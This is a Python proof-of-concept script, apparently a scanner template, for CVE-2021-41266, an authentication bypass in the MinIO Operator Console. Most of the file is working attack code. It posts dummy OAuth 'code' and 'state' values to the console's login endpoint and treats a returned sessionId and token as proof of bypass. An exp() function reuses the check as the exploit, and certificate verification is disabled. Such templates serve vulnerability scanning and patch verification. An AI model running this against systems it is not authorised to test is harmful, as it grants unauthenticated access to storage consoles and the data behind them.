import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''MinIO Operator Console Authentication Bypass''',
        "description": '''MinIO Console is a graphical user interface for the for MinIO Operator. MinIO itself is a multi-cloud object storage project. Affected versions are subject to an authentication bypass issue in the Operator Console when an external IDP is enabled.''',
        "severity": "critical",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2021-41266", 
            "https://github.com/minio/console/security/advisories/GHSA-4999-659w-mq36", 
            "https://github.com/minio/console/pull/1217"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvss-score": "",
            "cve-id": "CVE-2021-41266",
            "cwe-id": "CWE-306"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2021", "minio"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/api/v1/login/oauth2/auth"""
        method = "POST"
        data = """{"code":"test","state":"test"}"""
        headers = {'Accept': '*/*', 'Content-Type': 'application/json'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (resp0.status_code == 201 or resp0.status_code == 200) and ("""sessionId""" in resp0.text) and ("""token""" in str(resp0.headers)):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url